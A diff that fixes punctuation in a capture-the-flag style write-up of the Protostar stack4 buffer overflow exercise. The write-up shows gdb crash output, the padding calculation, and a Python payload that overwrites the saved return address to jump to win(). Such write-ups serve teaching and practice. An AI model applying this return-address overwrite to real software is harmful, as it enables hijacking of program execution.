@@ -4,10 +4,10 @@ Stack4 takes a look at overwriting saved EIP and standard buffer overflows.
 
 This level is at /opt/protostar/bin/stack4
 
-Hints
+Hints:
 
 1. A variety of introductory papers into buffer overflows may help.
-2. gdb lets you do “run < input”
+2. gdb lets you do “run < input”.
 3. EIP is not directly after the end of buffer, compiler padding can also increase the size.
 ## Source Code
 ```
@@ -46,9 +46,9 @@ Running this in the usual way, `python file.py > input`
 Program recieved signal SIGSEGV, Segmentation fault. 
 0x45454545 in ?? ()
 ```
-We can see that there is a fault at the memory address 0x45454545
-0x45 is the hex ascii code for 'E' so we can see that the 4 'E' letters are controling the return address
-So there were 12 letters before 'EEEE' so that means that we need 76 letters of padding before we overwrite the return
+We can see that there is a fault at the memory address 0x45454545.
+0x45 is the hex ascii code for 'E' so we can see that the 4 'E' letters are controling the return address.
+So there were 12 letters before 'EEEE' so that means that we need 76 letters of padding before we overwrite the return.
 64 + 12 = 76
 So lets modify the script:
 ```
@@ -58,7 +58,7 @@ exploit += 'BBBB'
 
 print(exploit)
 ```
-If we have done our maths correctly the program should fault at 0x42424242, hex code for 'B'
+If we have done our maths correctly the program should fault at 0x42424242, hex code for 'B'.
 ```
 Program recieved signal SIGSEGV, Segmentation fault. 
 0x42424242 in ?? ()
@@ -68,7 +68,7 @@ Ok we have full control of the return address, now we need to find the address o
 ```
 $1 = {void (void)} 0x80483f4 <win>
 ```
-So win is at 0x80483f4, great now we just need to add that to our script instead of 'BBBB' as our return address
+So win is at 0x80483f4, great now we just need to add that to our script instead of 'BBBB' as our return address.
 ```
 import struct
 rp = struct.pack('<L', 0x80483f4)
@@ -79,7 +79,7 @@ exploit += rp
 
 print(exploit)
 ```
-Now lets run this on the actual program because we should have a working exploit
+Now lets run this on the actual program because we should have a working exploit.
 `/opt/protostar/bin/stack4 < input`
 ```
 code flow successfully changed
